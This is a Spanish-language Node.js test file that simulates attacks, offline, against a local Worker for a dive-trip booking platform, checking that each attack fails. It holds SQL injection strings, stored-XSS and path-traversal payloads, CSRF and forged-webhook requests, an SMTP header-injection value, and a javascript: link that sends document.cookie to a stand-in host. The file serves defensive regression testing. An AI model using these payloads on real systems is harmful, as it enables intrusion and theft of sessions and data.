// Simulación de ataques (sin red): node --no-warnings worker/test/ataques.mjs
// Cada prueba intenta un ataque real contra el Worker local; «✗» = el ataque funcionó (vulnerabilidad)
import { D1, R2 } from './shim.mjs'
import worker, { handleApi } from '../index.js'

const ORIGIN = 'https://divingslot.test'
const db = new D1(new URL('../schema.sql', import.meta.url).pathname)
const env = { DB: db, AUTH_SECRET: 'prueba-secreto-de-32-caracteres-x', EMAIL_DEV_LOG: '1', PBKDF2_ITER: '1000', STAFF_MFA_OPTIONAL: '1', DIVE_PHOTOS: new R2(), CENTER_DOCS: new R2(), ASSETS: { fetch: () => new Response('app') } }
let fails = 0, passes = 0
const ok = (c, name, extra) => { if (c) passes++; else { fails++; console.log('  ✗', name, extra !== undefined ? JSON.stringify(extra).slice(0, 500) : '') } }
const section = (s) => console.log('·', s)
const mails = []
const log = console.log
console.log = (...a) => { if (a[0] === 'EMAIL (modo prueba)') mails.push({ to: a[1], subject: a[2], url: a[3] }); else log(...a) }
console.error = (...a) => { if (process.env.DEBUG) log(...a) }
globalThis.fetch = async (u) => { throw new Error('fetch no simulado ' + u) }
const pending = []

class Client {
  constructor() { this.cookie = ''; this.ip = '10.2.' + Math.floor(Math.random() * 250) + '.' + Math.floor(Math.random() * 250) }
  async raw(method, path, body) {
    const h = { Origin: ORIGIN, 'X-DivingSlot': '1', 'CF-Connecting-IP': this.ip }
    if (this.cookie) h.Cookie = this.cookie
    const bin = body instanceof Uint8Array
    if (body !== undefined && !bin) h['Content-Type'] = 'application/json'
    const res = await handleApi(new Request(ORIGIN + path, { method, headers: h, body: body === undefined ? undefined : bin ? body : JSON.stringify(body), redirect: 'manual' }), env, { waitUntil: (p) => pending.push(p) })
    await Promise.all(pending.splice(0))
    const sc = res.headers.get('Set-Cookie')
    if (sc) { const v = sc.split(';')[0]; this.cookie = v.endsWith('=') ? '' : v }
    return res
  }
  async call(m, p, b) { const r = await this.raw(m, p, b); const j = await r.json().catch(() => null); return { status: r.status, ...j } }
  rest(q) { return this.call('POST', '/api/rest', q) }
  rpc(n, a) { return this.call('POST', '/api/rpc/' + n, a) }
  async signup(email, data = {}) {
    await this.call('POST', '/api/auth/signup', { email, password: 'Clave1234', data })
    const link = new URL(mails.filter((m) => m.to === email).pop().url)
    await this.raw('GET', link.pathname + link.search)
  }
}
const code = (r) => r.error?.message?.split(':')[0]
const dep = (h) => new Date(Date.now() + h * 36e5).toISOString()


section('datos')
await db.batch([
  db.prepare("INSERT INTO destinations VALUES ('Panglao', 'Bohol', 'Visayas', 9.55, 123.77)"),
  db.prepare("INSERT INTO dive_sites (id, name, area, max_depth_m) VALUES ('s1', 'Balicasag', 'Panglao', 40)"),
  db.prepare("INSERT INTO centers (id, name, destination, listing_status, verification_status, gcash_number, notes) VALUES ('c1', 'Azul Divers', 'Panglao', 'socio', 'verified', '09171234567', 'nota interna secreta'), ('c2', 'Otro', 'Panglao', 'socio', 'verified', '09998887777', null)"),
  db.prepare("INSERT INTO boats (id, center_id, name, capacity) VALUES ('b1', 'c1', 'Banca', 10)"),
])
const owner = new Client(), A = new Client(), X = new Client(), other = new Client(), anon = new Client()
await owner.signup('owner@x.test', { full_name: 'Olga Owner', account_type: 'center' })
await other.signup('otro@x.test', { full_name: 'Otro Centro', account_type: 'center' })
for (const [e, c] of [['owner@x.test', 'c1'], ['otro@x.test', 'c2']]) {
  const uid = (await db.prepare('SELECT id FROM users WHERE email = ?').bind(e).first()).id
  await db.prepare("INSERT INTO center_staff (center_id, user_id, role) VALUES (?, ?, 'owner')").bind(c, uid).run()
}
await owner.call('POST', '/api/auth/login', { email: 'owner@x.test', password: 'Clave1234' })
await other.call('POST', '/api/auth/login', { email: 'otro@x.test', password: 'Clave1234' })
await A.signup('a@x.test', { full_name: 'Ana Pérez' })
await X.signup('x@x.test', { full_name: 'Xavi Intruso' })
const uidA = (await db.prepare("SELECT id FROM users WHERE email = 'a@x.test'").first()).id
const uidX = (await db.prepare("SELECT id FROM users WHERE email = 'x@x.test'").first()).id
const dA = (await db.prepare('SELECT id FROM divers WHERE user_id = ?').bind(uidA).first()).id
const dX = (await db.prepare('SELECT id FROM divers WHERE user_id = ?').bind(uidX).first()).id
await db.batch([
  db.prepare("INSERT INTO trips (id, center_id, boat_id, departs_at, price_php, divers_per_guide, guides, status) VALUES ('t1', 'c1', 'b1', ?, 3000, 4, 2, 'published')").bind(dep(48)),
  db.prepare("INSERT INTO trips (id, center_id, boat_id, departs_at, price_php, divers_per_guide, guides, status) VALUES ('t2', 'c1', 'b1', ?, 3000, 4, 2, 'draft')").bind(dep(72)),
  db.prepare("INSERT INTO trip_sites (trip_id, site_id, position) VALUES ('t1', 's1', 1)"),
  db.prepare("INSERT INTO bookings (id, trip_id, diver_id, seats, status, amount_php) VALUES ('bk1', 't1', ?, 1, 'confirmed', 3000)").bind(dA),
])
// Ana sube un fichero privado (p. ej. la evaluación de su médico)
const pdf = new TextEncoder().encode('%PDF-1.4 secreto de Ana')
await A.raw('PUT', `/api/storage/upload/dive-photos/${uidA}/medico/f1-1.pdf`, pdf)
const vuln = (cond, name, extra) => ok(!cond, 'ATAQUE: ' + name, extra)

section('1. Lectura de columnas privadas por filtros (oráculo ciego)')
let r = await X.rest({ table: 'centers', select: 'id', filters: [['gcash_number', 'like', '0917*']] })
vuln(r.data?.length === 1, 'filtrar por gcash_number revela el número del centro', r)
r = await anon.rest({ table: 'centers', select: 'id', filters: [['notes', 'ilike', '%secreta%']] })
vuln(r.data?.length === 1, 'filtrar por notas internas sin sesión', r)
r = await X.rest({ table: 'centers', select: 'id', or: 'gcash_number.like.0917*' })
vuln(r.data?.length === 1, 'oráculo con or()', r)
r = await X.rest({ table: 'centers', select: 'id', order: [{ col: 'gcash_number', ascending: true }] })
vuln(r.data?.[0]?.id === 'c1' && !r.error, 'ordenar por gcash_number revela el orden', r)
r = await X.rest({ table: 'trips', select: 'id, centers!inner(id)', filters: [['centers.gcash_number', 'like', '0917*']] })
vuln(r.data?.length >= 1, 'oráculo a través de una tabla incrustada', r)

section('2. Inyección SQL en select, filtros y orden')
for (const [n, q] of [
  ['select', { table: 'centers', select: 'id, name FROM centers; --' }],
  ['columna en filtro', { table: 'centers', select: 'id', filters: [['id = id OR 1=1 --', 'eq', 'x']] }],
  ['operador', { table: 'centers', select: 'id', filters: [['id', 'eq) OR (1=1', 'x']] }],
  ['orden', { table: 'centers', select: 'id', order: [{ col: 'name; DROP TABLE users', ascending: true }] }],
  ['or', { table: 'centers', select: 'id', or: 'id.eq.x) OR (1=1' }],
  ['alias', { table: 'trips', select: 'id, x:centers(id, gcash_number)' }],
  ['limit', { table: 'dive_sites', select: 'id', limit: '1; DROP TABLE users' }],
]) { r = await X.rest(q); vuln(!r.error && r.status === 200 && JSON.stringify(r.data).includes('0917'), 'inyección por ' + n, r) }
ok(await db.prepare('SELECT count(*) AS n FROM users').first().then((x) => x.n > 0), 'la tabla users sigue ahí')
r = await anon.rest({ table: 'dive_sites', select: 'id', limit: -1 })
vuln(r.status === 200 && !r.error && r.data?.length > 0 && r.data.length > 5000, 'limit negativo = sin límite (DoS)', r.data?.length)

section('3. Acceso a datos de otros (IDOR)')
r = await X.rest({ table: 'bookings', select: '*' }); vuln(r.data?.length > 0, 'leer reservas de otros', r.data)
r = await X.rest({ table: 'divers', select: '*' }); vuln(r.data?.some((d) => d.id === dA), 'leer el perfil de otro buceador', r.data)
r = await anon.rest({ table: 'users', select: '*' }); vuln(r.status === 200 && r.data?.length, 'leer la tabla users', r)
r = await anon.rest({ table: 'sessions', select: '*' }); vuln(r.status === 200 && r.data?.length, 'leer sesiones', r)
r = await X.rest({ table: 'payments', select: '*' }); vuln(r.data?.length, 'leer pagos de otros', r)
r = await other.rest({ table: 'trips', select: '*', filters: [['id', 'eq', 't2']] }); vuln(r.data?.length, 'otro centro ve un borrador ajeno', r)
r = await X.rest({ table: 'center_verifications', select: '*' }); vuln(r.data?.length, 'documentos de verificación ajenos', r)
r = await X.rpc('booking_chat', { p_booking: 'bk1' }); vuln(!r.error, 'leer el chat de otro', r)
r = await X.rpc('center_private', { p_center: 'c1' }); vuln(!r.error && JSON.stringify(r).includes('0917'), 'datos privados de un centro ajeno', r)

section('4. Escalada de privilegios y asignación masiva')
r = await X.rest({ table: 'centers', op: 'update', values: { verification_status: 'verified' }, filters: [['id', 'eq', 'c1']] }); vuln(!r.error && (await db.prepare("SELECT name FROM centers WHERE id='c1'").first()).name !== 'Azul Divers', 'modificar un centro ajeno', r)
r = await other.rest({ table: 'trips', op: 'insert', values: { center_id: 'c1', boat_id: 'b1', departs_at: dep(100), price_php: 1, divers_per_guide: 4, guides: 1 } }); vuln(!r.error, 'crear salida en un centro ajeno', r)
r = await other.rest({ table: 'trips', op: 'update', values: { center_id: 'c2' }, filters: [['id', 'eq', 't1']] }); vuln(!r.error && (await db.prepare("SELECT center_id FROM trips WHERE id='t1'").first()).center_id === 'c2', 'robar una salida cambiando center_id', r)
r = await X.rest({ table: 'certifications', op: 'insert', values: { diver_id: dX, agency: 'PADI', level: 'instructor', verified_by: 'c1', verified_at: new Date().toISOString() } }); vuln(!r.error, 'autoverificar una certificación', r)
r = await X.rest({ table: 'divers', op: 'update', values: { user_id: uidA }, filters: [['id', 'eq', dX]] }); vuln(!r.error, 'apropiarse del perfil de otro (user_id)', r)
r = await X.rest({ table: 'dive_logs', op: 'insert', values: { diver_id: dX, site_name: 'x', dive_date: '2026-11-01', signed_by_center: 'c1', signed_at: new Date().toISOString() } }); vuln(!r.error, 'falsificar la firma del centro en la bitácora', r)
r = await X.rpc('admin_grant', { p_email: 'x@x.test' }); vuln(!r.error, 'hacerse administrador', r)
r = await X.rpc('review_center', { p_center: 'c2', p_status: 'suspended' }); vuln(!r.error, 'suspender un centro sin ser admin', r)
r = await X.call('GET', '/api/stats'); vuln(r.status === 200, 'ver estadísticas de admin', r.status)

section('5. Ficheros privados')
r = await X.rest({ table: 'certifications', op: 'insert', values: { diver_id: dX, agency: 'PADI', level: 'open_water', photo_path: `${uidA}/medico/f1-1.pdf` }, returning: true, select: 'id' })
const certX = (await db.prepare('SELECT id FROM certifications WHERE diver_id = ?').bind(dX).first())?.id
r = certX ? await X.rpc('cert_photo_url', { p_cert: certX }) : {}
let got = r.data?.url ? await X.raw('GET', r.data.url) : null
vuln(got?.status === 200, 'leer el PDF médico de otro con una certificación trucada (photo_path)', r)
r = await X.call('POST', '/api/storage/sign', { bucket: 'dive-photos', paths: [`${uidA}/medico/f1-1.pdf`] }); vuln(r.data?.[0]?.signedUrl, 'firmar un fichero ajeno', r)
got = await X.raw('GET', `/api/storage/object/dive-photos/${uidA}/medico/f1-1.pdf?exp=9999999999&sig=00`); vuln(got.status === 200, 'descargar con firma falsa', got.status)
got = await X.raw('PUT', `/api/storage/upload/dive-photos/${uidA}/hack.jpg`, new Uint8Array([0xff, 0xd8, 0xff, 1])); vuln(got.status === 200, 'subir a la carpeta de otro', got.status)
got = await X.raw('PUT', `/api/storage/upload/dive-photos/${uidX}/../${uidA}/h.jpg`, new Uint8Array([0xff, 0xd8, 0xff, 1])); vuln(got.status === 200, 'path traversal al subir', got.status)
got = await X.raw('PUT', `/api/storage/upload/dive-photos/${uidX}/x.html`, new TextEncoder().encode('<script>alert(1)</script>')); vuln(got.status === 200, 'subir HTML (XSS almacenado)', got.status)
r = await X.call('POST', '/api/storage/remove', { bucket: 'dive-photos', paths: [`${uidA}/medico/f1-1.pdf`] }); vuln(!env.DIVE_PHOTOS.m.has(`${uidA}/medico/f1-1.pdf`), 'borrar un fichero ajeno', r)

section('6. CSRF y sesión')
let res = await handleApi(new Request(ORIGIN + '/api/rest', { method: 'POST', headers: { Origin: 'https://evil.test', 'X-DivingSlot': '1', Cookie: A.cookie, 'Content-Type': 'application/json' }, body: JSON.stringify({ table: 'divers', op: 'update', values: { bio: 'hackeado' }, filters: [['id', 'eq', dA]] }) }), env, { waitUntil() {} })
vuln(res.status === 200, 'CSRF desde otro origen', res.status)
res = await handleApi(new Request(ORIGIN + '/api/rest', { method: 'POST', headers: { Cookie: A.cookie, 'Content-Type': 'text/plain' }, body: JSON.stringify({ table: 'divers', op: 'update', values: { bio: 'hackeado' }, filters: [['id', 'eq', dA]] }) }), env, { waitUntil() {} })
vuln(res.status === 200, 'CSRF sin cabecera X-DivingSlot (formulario simple)', res.status)
const cookieA = A.cookie
await A.call('POST', '/api/auth/logout')
const ghost = new Client(); ghost.cookie = cookieA
r = await ghost.rpc('my_medical', {}); vuln(!r.error, 'reutilizar la cookie después de cerrar sesión', r)
await A.call('POST', '/api/auth/login', { email: 'a@x.test', password: 'Clave1234' })
const forged = new Client(); forged.cookie = '__Host-ds_session=' + 'A'.repeat(43)
r = await forged.rpc('my_medical', {}); vuln(!r.error, 'cookie inventada', r)

section('7. Fuerza bruta y abuso')
const brute = new Client(); let blocked = false
for (let i = 0; i < 15; i++) { const x = await brute.call('POST', '/api/auth/login', { email: 'a@x.test', password: 'Mala' + i + 'xx1' }); if (x.status === 429) { blocked = true; break } }
vuln(!blocked, 'probar contraseñas sin límite', blocked)
r = await A.rpc('book_trip', { p_trip: 't1', p_seats: -5, p_with_gear: false, p_medical_signed: true }); vuln(!r.error, 'reservar plazas negativas', r)
r = await A.rpc('book_trip', { p_trip: 't1', p_seats: 1, p_with_gear: false, p_medical_signed: true, p_extras: [{ id: 'no-existe', qty: -10 }] }); vuln(!r.error && r.data?.amount_php < 3000, 'abaratar la reserva con extras negativos', r)
r = await A.rpc('book_trip', { p_trip: 't2', p_seats: 1, p_with_gear: false, p_medical_signed: true }); vuln(!r.error, 'reservar una salida en borrador', r)
r = await X.rpc('submit_review', { p_center: 'c1', p_rating: 1, p_body: 'malo' }); vuln(!r.error, 'reseña sin haber reservado', r)

section('8. Correos a direcciones ajenas')
r = await X.rest({ table: 'divers', op: 'update', values: { email: 'victima@ejemplo.test' }, filters: [['id', 'eq', dX]] })
vuln(!r.error && (await db.prepare('SELECT email FROM divers WHERE id = ?').bind(dX).first()).email === 'victima@ejemplo.test', 'cambiar el email de avisos sin verificarlo (envío de correos a terceros)', r)

section('9. Webhook de pagos falso')
res = await handleApi(new Request(ORIGIN + '/api/webhooks/paymongo', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Paymongo-Signature': 't=1,te=abc,li=abc' }, body: JSON.stringify({ data: { attributes: { type: 'checkout_session.payment.paid', data: { attributes: { metadata: { booking_id: 'bk1' } } } } } }) }), env, { waitUntil() {} })
vuln(res.status === 200 && (await db.prepare("SELECT paid_php FROM bookings WHERE id='bk1'").first()).paid_php > 0, 'marcar una reserva como pagada con un webhook falso', res.status)

section('10. XSS en el widget público')
await db.prepare("UPDATE centers SET name = '<script>alert(1)</script>' WHERE id = 'c1'").run()
res = await worker.fetch(new Request(ORIGIN + '/w/c1'), env, { waitUntil() {} })
const html = await res.text()
vuln(html.includes('<script>alert(1)</script>'), 'nombre del centro con <script> en el widget', html.slice(0, 200))
await db.prepare("UPDATE centers SET name = 'Azul Divers' WHERE id = 'c1'").run()
res = await worker.fetch(new Request(ORIGIN + '/r/c1?t=//evil.test'), env, {}); vuln(/evil\.test/.test(res.headers.get('Location') || '') && !res.headers.get('Location').startsWith(ORIGIN), 'redirección abierta en /r/', res.headers.get('Location'))

section('11. Fuzzing de todas las RPC (anónimo y buceador)')
const { RPC } = await import('../rpc.js')
const crashes = [], openToAnon = []
const junk = [{}, { p_trip: "' OR 1=1 --", p_center: 'c1', p_booking: 'bk1', p_id: null }, { p_center: ['c1'], p_trip: { $gt: '' }, p_seats: 1e9 }]
for (const name of Object.keys(RPC)) {
  for (const who of [anon, X]) for (const args of junk) {
    const x = await who.rpc(name, args)
    if (x.status >= 500) crashes.push(`${name} ${junk.indexOf(args)} ${who === anon ? 'anon' : 'diver'}`)
  }
}
vuln(crashes.length, 'errores 500 (fallos internos que pueden filtrar información)', [...new Set(crashes)])

section('12. Segunda ronda: pagos, equipo, check-in y perfiles')
await db.prepare("INSERT OR REPLACE INTO app_config (key, value) VALUES ('payments_mode', 'demo')").run()
await db.prepare("INSERT INTO bookings (id, trip_id, diver_id, seats, status, amount_php) VALUES ('bk2', 't1', ?, 1, 'pending_payment', 3000)").bind(dA).run()
r = await X.rpc('confirm_payment_demo', { p_booking: 'bk2', p_kind: 'full' }); vuln(!r.error, 'pagar (modo demo) la reserva de otro', r)
r = await other.rpc('record_cash_payment', { p_booking: 'bk1', p_amount: 100 }); vuln(!r.error, 'otro centro apunta un cobro en efectivo', r)
r = await owner.rpc('record_cash_payment', { p_booking: 'bk1', p_amount: -500 }); vuln(!r.error, 'cobro en efectivo negativo', r)
r = await owner.rpc('team_invite', { p_center: 'c1', p_email: 'x@x.test', p_role: 'owner' }); vuln(!r.error, 'invitar como titular', r)
r = await other.rpc('team_invite', { p_center: 'c1', p_email: 'otro@x.test', p_role: 'manager' }); vuln(!r.error, 'invitarse a un centro ajeno', r)
r = await other.rpc('team_remove', { p_center: 'c1', p_user: (await db.prepare("SELECT id FROM users WHERE email='owner@x.test'").first()).id }); vuln(!r.error, 'quitar al titular de otro centro', r)
r = await other.rpc('checkin_scan', { p_code: 'DSCHK:00000000-0000-0000-0000-000000000000:ABCDEF12' }); vuln(!r.error, 'check-in con un QR inventado', r)
r = await X.rpc('checkin_pass', { p_booking: 'bk1' }); vuln(!r.error, 'sacar el QR de embarque de otro', r)
r = await anon.rpc('public_diver', { p_id: dA }); vuln(!r.error, 'ver un perfil privado', r)
r = await X.rpc('set_center_photo', { p_center: 'c1', p_path: `${uidX}/center-photo/x.jpg` }); vuln(!r.error, 'cambiar la foto de un centro ajeno', r)
r = await X.rpc('submit_center_verification', { p_center: 'c1' }); vuln(!r.error, 'enviar la verificación de otro centro', r)
r = await X.rpc('admin_users', {}); vuln(!r.error, 'listar usuarios sin ser admin', r)
r = await X.rpc('admin_backup_now', {}); vuln(!r.error, 'lanzar copias de seguridad sin ser admin', r)
r = await X.rpc('post_trip_message', { p_trip: 't1', p_body: 'spam' }); vuln(!r.error, 'escribir en el chat de una salida sin reserva', r)

section('13. Abuso de volumen')
const many = Array.from({ length: 1500 }, (_, i) => ({ diver_id: dX, site_name: 'x' + i, dive_date: '2026-11-01' }))
r = await X.rest({ table: 'dive_logs', op: 'insert', values: many })
vuln(!r.error, 'insertar 1500 filas en una sola petición (llenar la base de datos)', r.error)
let hits = 0
for (let i = 0; i < 80; i++) { await handleApi(new Request(ORIGIN + '/api/hit', { method: 'POST', headers: { 'User-Agent': 'Mozilla/5.0', 'CF-Connecting-IP': '9.9.9.9' }, body: JSON.stringify({ p: '/x' + i }) }), env, { waitUntil() {} }) }
hits = (await db.prepare("SELECT count(*) AS n FROM visits WHERE path LIKE '/x%'").first()).n
vuln(hits > 60, 'inundar las estadísticas de visitas desde una IP', hits)
const { sendEmail } = await import('../email.js')
let injected = false
try { await sendEmail(env, 'victima@x.test>\r\nRCPT TO:<otro@x.test', { subject: 's', html: 'h' }); injected = true } catch (e) { /* rechazado */ }
vuln(injected, 'destinatario de email con saltos de línea (inyección SMTP)')

section('14. XSS por enlaces (javascript:)')
r = await owner.rest({ table: 'centers', op: 'update', values: { website: 'javascript:fetch(`//evil.test?c=`+document.cookie)' }, filters: [['id', 'eq', 'c1']] })
vuln(!r.error, 'web del centro con javascript:', r)
r = await owner.rest({ table: 'centers', op: 'update', values: { website: 'https://azuldivers.example' }, filters: [['id', 'eq', 'c1']] })
ok(!r.error, 'una web normal sí se guarda', r)

log(`\n${passes} bien, ${fails} mal`)
process.exit(fails ? 1 : 0)
